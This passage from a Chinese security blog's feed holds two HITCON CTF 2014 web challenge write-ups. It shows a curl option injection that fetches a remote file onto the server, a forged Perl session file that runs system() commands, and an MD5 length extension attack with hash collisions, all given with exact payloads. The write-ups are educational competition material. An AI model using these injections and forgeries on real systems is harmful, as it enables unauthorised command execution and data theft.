<p>再通过在web界面提交：<code>-o /tmp/aaebc6da0de8cf02b348c8eb4a3f585f http://www.watch0ut.com/test.txt</code></p>
<p>成功写入服务器session文件!再试试改shell参数执行命令，结果返回空白。失望。</p>
<h2 id="session文件执行命令"><a href="#session文件执行命令" class="headerlink" title="session文件执行命令"></a>session文件执行命令</h2><p>再看看代码read_session函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">sub read_session</div><div class="line">&#123;</div><div class="line">    undef %sesshash;</div><div class="line">    if(! -f &quot;$SESSDIR/$sessfile&quot;)</div><div class="line">    &#123;</div><div class="line">        print &quot;session error!&quot;;</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line">    open(GG, &quot;$SESSDIR/$sessfile&quot;) and do &#123;</div><div class="line">        while (&lt;GG&gt;) &#123;</div><div class="line">            eval($_);</div><div class="line">        &#125;</div><div class="line">        close GG;</div><div class="line">    &#125;;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>eval($_)</code>！！！！这是神马？！很熟悉吧，php一句话木马常用的函数。</p>
<p>再构造一个session文件，通过web界面curl提交替换到服务器上：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$sesshash&#123;&apos;ip&apos;&#125; = &apos;21.194.11.***&apos;;</div><div class="line">$sesshash&#123;&apos;user&apos;&#125; = &apos;admin&apos;;</div><div class="line">system(“ls -l /”);</div><div class="line">print GG;</div></pre></td></tr></table></figure></p>
<p>:D成功把根目录所有文件显示在网页。也就是可以通过构造session文件在服务器上执行shell命令。根目录有read_key,key.txt文件，最终通过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$sesshash&#123;&apos;ip&apos;&#125; = &apos;21.194.11.***&apos;;</div><div class="line">$sesshash&#123;&apos;user&apos;&#125; = &apos;admin&apos;;</div><div class="line">system(“/read_key /key.txt”);</div><div class="line">print GG;</div></pre></td></tr></table></figure></p>
<p>获取key：<code>HITCON{a755be06b165ed8fc4710d3544fce942}</code></p>
<p>:)</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;DIAGCGI&quot;&gt;&lt;a href=&quot;#DIAGCGI&quot; class=&quot;headerlink&quot; title=&quot;DIAGCGI&quot;&gt;&lt;/a&gt;DIAGCGI&lt;/h1&gt;&lt;p&gt;Description&lt;br&gt;&lt;a href=&quot;http://54.92.127.128:16888
    
    </summary>
    
      <category term="CTF" scheme="http://blog.watch0ut.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://blog.watch0ut.com/tags/CTF/"/>
    
      <category term="Web" scheme="http://blog.watch0ut.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>HITCON CTF 2014 PY4H4SHER Write-up</title>
    <link href="http://blog.watch0ut.com/2014/08/20/HITCON-CTF-2014-PY4H4SHER-Write-up/"/>
    <id>http://blog.watch0ut.com/2014/08/20/HITCON-CTF-2014-PY4H4SHER-Write-up/</id>
    <published>2014-08-20T09:16:30.000Z</published>
    <updated>2015-11-15T13:55:08.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PY4H4SHER"><a href="#PY4H4SHER" class="headerlink" title="PY4H4SHER"></a>PY4H4SHER</h1><p>Category: Web Points: 200<br>Description:<br><a href="http://203.66.14.43/cgi-bin/py4h4sher" target="_blank" rel="external">http://203.66.14.43/cgi-bin/py4h4sher</a></p>
<p>通过页面上的Get Source获得如下源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># coding: utf-8</div><div class="line"></div><div class="line">import os</div><div class="line">import re</div><div class="line">import sys</div><div class="line">import cgi</div><div class="line">import hashlib</div><div class="line">from urllib import unquote</div><div class="line">from passlib.utils.pbkdf2 import pbkdf2</div><div class="line"></div><div class="line">###</div><div class="line"></div><div class="line">sys.path.append(&apos;/home/orange/secret_file&apos;)</div><div class="line">from secret_file import SECRET # 160 bytes secret</div><div class="line">from secret_file import FLAG</div><div class="line"></div><div class="line">###</div><div class="line"></div><div class="line">print &apos;Content-Type: text/html\n\n&apos;</div><div class="line"></div><div class="line">### </div><div class="line"></div><div class="line">def _pbkdf2(text):</div><div class="line">    return pbkdf2(text, &apos;noggnogg&apos;, 1337).encode(&apos;hex&apos;).lower()</div><div class="line"></div><div class="line">def _md5(text):</div><div class="line">    return hashlib.md5( text ).hexdigest().lower()</div><div class="line"></div><div class="line">def getenv(name):</div><div class="line">    return unquote( os.environ.get(name) ) or &apos;&apos;</div><div class="line"></div><div class="line">def gotoFail():</div><div class="line">    print &apos;goto fail&apos;</div><div class="line">    print</div><div class="line">    exit()</div><div class="line"></div><div class="line">def m_hash(password):</div><div class="line">    nr = int( &apos;P0W5&apos;.encode(&apos;hex&apos;), 16 )</div><div class="line">    add = 7</div><div class="line">    nr2 = 305419889</div><div class="line"></div><div class="line">    for c in (ord(x) for x in password if x not in (&apos; &apos;, &apos;\t&apos;)):</div><div class="line">        nr^= (((nr &amp; 63)+add)*c)+ (nr &lt;&lt; 8) &amp; 0xFFFFFFFF</div><div class="line">        nr2= (nr2 + ((nr2 &lt;&lt; 8) ^ nr)) &amp; 0xFFFFFFFF</div><div class="line">        add= (add + c) &amp; 0xFFFFFFFF</div><div class="line"></div><div class="line">    return &quot;%08x%08x&quot; % (nr &amp; 0x7FFFFFFF,nr2 &amp; 0x7FFFFFFF)</div><div class="line">###</div><div class="line"></div><div class="line">request = cgi.FieldStorage() </div><div class="line"></div><div class="line">checksum  = request.getvalue(&apos;checksum&apos;) or &apos;&apos;</div><div class="line">query_str = getenv(&apos;QUERY_STRING&apos;)</div><div class="line">if _md5( SECRET + query_str ) == checksum:</div><div class="line">    mode = request.getvalue(&apos;mode&apos;) or &apos;&apos;</div><div class="line"></div><div class="line">    if mode == &apos;download&apos;:</div><div class="line">        filename = request.getvalue(&apos;filename&apos;) or &apos;&apos;</div><div class="line">        filename = os.path.basename( filename )</div><div class="line">        try:</div><div class="line">            print open(filename).read()</div><div class="line">        except IOError as e:</div><div class="line">            print &apos;No such file or directory&apos;</div><div class="line">    elif mode == &apos;eval&apos;:</div><div class="line">        bad_string = request.getvalue(&apos;filename&apos;) or &apos;&apos;</div><div class="line">        good_string = bad_string.encode(&apos;hex&apos;)</div><div class="line">        eval(good_string)</div><div class="line"></div><div class="line">    else:</div><div class="line">        stage1 = request.getvalue(&apos;stage1&apos;) or &apos;&apos;</div><div class="line">        if m_hash(stage1) != &apos;4141414141414141&apos;:</div><div class="line">            gotoFail()</div><div class="line"></div><div class="line">        ### </div><div class="line">        </div><div class="line">        plaintext = getenv(&apos;HTTP_USER_AGENT&apos;)</div><div class="line">        stage2 = request.getvalue(&apos;stage2&apos;) or &apos;&apos;</div><div class="line">        if stage2 == plaintext:</div><div class="line">            gotoFail()</div><div class="line">        </div><div class="line">        if _pbkdf2(plaintext) != _pbkdf2(stage2):</div><div class="line">            gotoFail()</div><div class="line"></div><div class="line">        ###</div><div class="line"></div><div class="line">        stage3 = request.getvalue(&apos;stage3&apos;) or &apos;&apos;</div><div class="line">        stage3 = stage3[0]+stage3[1]+stage3[3]+stage3[5]</div><div class="line">        if _md5( stage3 ) != &apos;90954349a0e42d8e4426a4672bde16b9&apos;:</div><div class="line">            gotoFail()</div><div class="line"></div><div class="line">        ###</div><div class="line"></div><div class="line">        print &apos;Congrat! The flag is&apos;, </div><div class="line">        print &apos;HITCON&#123;%s&#125;&apos; % FLAG</div><div class="line"></div><div class="line">else:</div><div class="line">    checksum = _md5( SECRET + &apos;filename=py4h4sher&amp;mode=download&apos; )</div><div class="line">    print &quot;&quot;&quot;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">  &lt;meta http-equiv=&apos;Content-Type&apos; content=&apos;text/html; charset=utf-8&apos;&gt;</div><div class="line">  &lt;meta name=&quot;author&quot; content=&quot;orange@chroot.org&quot;&gt;</div><div class="line">  &lt;title&gt; PY4H4SHER &lt;/title&gt;</div><div class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;//netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap.min.css&quot;&gt;</div><div class="line"></div><div class="line">  &lt;style&gt;</div><div class="line">/* </div><div class="line">Inspired by http://dribbble.com/shots/890759-Ui-Kit-Metro/attachments/97174</div><div class="line">*/</div><div class="line">.out &#123;</div><div class="line">    white-space: -moz-pre-wrap;</div><div class="line">    white-space: -pre-wrap;</div><div class="line">    white-space: -o-pre-wrap;</div><div class="line">    white-space: pre-wrap; </div><div class="line">    word-wrap: break-word; /* Internet Explorer 5.5+ */ </div><div class="line">    background-color: white;</div><div class="line">    border: 0px;</div><div class="line">&#125;</div><div class="line"></div><div class="line">.nav-row &#123;</div><div class="line">  text-align: center;</div><div class="line">&#125;</div><div class="line">.nav-row p &#123;</div><div class="line">  padding: 5px;</div><div class="line">&#125;</div><div class="line">.nav-row .col-md-2 &#123;</div><div class="line">  background-color: #fff;</div><div class="line">  border: 1px solid #e0e1db;</div><div class="line">  border-right: none;</div><div class="line">&#125;</div><div class="line">.nav-row .col-md-2:last-child &#123;</div><div class="line">  border: 1px solid #e0e1db;</div><div class="line">&#125;</div><div class="line">.nav-row .col-md-2:first-child &#123;</div><div class="line">  border-radius: 5px 0 0 5px;</div><div class="line">&#125;</div><div class="line">.nav-row .col-md-2:last-child &#123;</div><div class="line">  border-radius: 0 5px 5px 0;</div><div class="line">&#125;</div><div class="line">.nav-row .col-md-2:hover &#123;</div><div class="line">  color: #e92d00;</div><div class="line">  cursor: pointer;</div><div class="line">&#125;</div><div class="line">.nav-row .glyphicon &#123;</div><div class="line">  padding-top: 15px;</div><div class="line">  font-size: 40px;</div><div class="line">&#125;</div><div class="line"></div><div class="line">  &lt;/style&gt;</div><div class="line">   &lt;script src=&quot;//ajax.useso.com/ajax/libs/jquery/1.7.2/jquery.min.js&quot;&gt;&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;             </div><div class="line">&lt;script&gt;</div><div class="line">  var script_name = &apos;/cgi-bin/py4h4sher&apos;;</div><div class="line"></div><div class="line">  function gohome()&#123;</div><div class="line">    window.open( &apos;http://hitcon.org&apos; );</div><div class="line">  &#125;</div><div class="line">  function getflag()&#123;</div><div class="line">      $.get( script_name , </div><div class="line">              function(data)&#123;         </div><div class="line">                  $(&apos;.out&apos;).text(&apos;nothing to do :(&apos;);</div><div class="line">              &#125;);</div><div class="line">  &#125;</div><div class="line">  function getsource()&#123;</div><div class="line">      $.post( script_name + &apos;?filename=py4h4sher&amp;mode=download&apos;, </div><div class="line">              &#123;&apos;checksum&apos;: &apos;%s&apos;&#125;,</div><div class="line">              function(data)&#123;</div><div class="line">                  $(&apos;.out&apos;).text(data);</div><div class="line">              &#125;);</div><div class="line">  &#125;</div><div class="line">&lt;/script&gt;</div><div class="line"></div><div class="line">&lt;div class=&quot;container&quot; style=&quot;margin-top:160px;&quot;&gt;</div><div class="line">    &lt;div class=&quot;row nav-row&quot;&gt;</div><div class="line">      &lt;div class=&quot;col-md-3&quot;&gt;</div><div class="line">      &lt;/div&gt;</div><div class="line">      &lt;div class=&quot;col-md-2&quot; onclick=&apos;gohome()&apos;&gt;</div><div class="line">        &lt;span class=&quot;glyphicon glyphicon-home&quot;&gt;&lt;/span&gt;</div><div class="line">        &lt;p&gt; Go Home &lt;/p&gt;</div><div class="line">      &lt;/div&gt;</div><div class="line">      &lt;div class=&quot;col-md-2&quot; onclick=&apos;getflag()&apos;&gt;</div><div class="line">        &lt;span class=&quot;glyphicon glyphicon-flag&quot;&gt;&lt;/span&gt;</div><div class="line">        &lt;p&gt; Get Flag &lt;/p&gt;</div><div class="line">      &lt;/div&gt;</div><div class="line">      &lt;div class=&quot;col-md-2&quot; onclick=&apos;getsource()&apos;&gt;</div><div class="line">        &lt;span class=&quot;glyphicon glyphicon-cloud-download&quot;&gt;&lt;/span&gt;</div><div class="line">        &lt;p&gt; Get Source &lt;/p&gt;</div><div class="line">      &lt;/div&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line"></div><div class="line">    &lt;div class=&apos;row nav-row&apos;&gt;</div><div class="line">      &lt;pre class=&apos;out&apos; style=&apos;padding-top:64px; &apos;&gt;</div><div class="line">      &lt;/pre&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">&lt;/div&gt;</div><div class="line"></div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div><div class="line">&quot;&quot;&quot; % checksum</div></pre></td></tr></table></figure></p>
<p>在源码中还会得到一个checksum:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">af247ce6e8c70768eae27ec6feae34f6</div></pre></td></tr></table></figure></p>
<p>分析源码可知，checksum是QUERY_STRING的MD5值，但是用了SECRET。该checksum是通过POST形式提交的，要修改QUERY_STRING并通过checksum的验证，可以利用Length Extension Attack，页面中有现成的工具，我这里使用的是Hash Extender 。</p>
<p>由于mode的值不能是download和eval，这里随意添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">hash_extender -s af247ce6e8c70768eae27ec6feae34f6 -d filename=py4h4sher\&amp;mode=download -a aaaa --secret-min=160 --secret-max=160 --out-data-format=html</div><div class="line"></div><div class="line">Type: md5</div><div class="line">Secret length: 160</div><div class="line">New signature: 5ce89b806119dac3f2508022e0b328de</div><div class="line">New string: filename%3dpy4h4sher%26mode%3ddownload%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%06%00%00%00%00%00%00aaaa</div><div class="line">QUERY_STRING:</div><div class="line"></div><div class="line">filename%3dpy4h4sher%26mode%3ddownload%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%06%00%00%00%00%00%00aaaa</div><div class="line">checksum：</div><div class="line"></div><div class="line">5ce89b806119dac3f2508022e0b328de</div></pre></td></tr></table></figure></p>
<h2 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h2><p>搜索m_hash函数，找到Old MySQL Password Hash，继续搜索对此方法的crack，找到MySQL323 Cracker，使用页面中提到的工具mysql323 collider，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">mysql323 collider 32.exe -h 4141414141414141 -m 512 -t 10</div><div class="line">Initializing...</div><div class="line">Took 5.67 sec</div><div class="line">3.419 Pp/s [12.8% 4.1% 4.1% 13.0% 12.5% 12.0% 12.4% 12.9% 4.2% 12.2%]</div><div class="line">4141414141414141:21704a5b72356c3424605a7c3e7e:!pJ[r5l4$`Z|&gt;~</div><div class="line"></div><div class="line">Crack time: 284.658 seconds</div><div class="line">Average speed: 3.426 Pp/s</div></pre></td></tr></table></figure></p>
<p>得到stage1为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">!pJ[r5l4$`Z|&gt;~</div></pre></td></tr></table></figure></p>
<h2 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h2><p>搜索pbkdf2，得到PBKDF2，继续搜索找到<code>PBKDF2+HMAC hash collisions explained</code>，页面中有提供计算出的字符串，这里直接使用如下两个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaavutrypa</div><div class="line">d63mH`L=IW3Ucwb.FRec</div></pre></td></tr></table></figure></p>
<p>第一个做为stage2的值，第二个作为User-agent的值。</p>
<h2 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h2><p>对于stage3，直接搜索MD5，得到enigma；</p>
<p>最终POST的数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">checksum=d9c85e053a9215db9e03c0bfb1934e1a&amp;stage1=!pJ[r5l4$`Z|&gt;~&amp;stage2=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaavutrypa&amp;stage3=e&amp;stage3=n&amp;stage3=n&amp;stage3=i&amp;stage3=n&amp;stage3=gma</div></pre></td></tr></table></figure></p>
<p>将以上内容提交，得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Congrat! The flag is HITCON&#123;th1s_1s_bas1c_cha11enge_f0r_p3nt3st3r!&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;PY4H4SHER&quot;&gt;&lt;a href=&quot;#PY4H4SHER&quot; class=&quot;headerlink&quot; title=&quot;PY4H4SHER&quot;&gt;&lt;/a&gt;PY4H4SHER&lt;/h1&gt;&lt;p&gt;Category: Web Points: 200&lt;br&gt;Description:&lt;
    
    </summary>
    
      <category term="CTF" scheme="http://blog.watch0ut.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://blog.watch0ut.com/tags/CTF/"/>
    
      <category term="Web" scheme="http://blog.watch0ut.com/tags/Web/"/>
    
  </entry>
  
</feed>
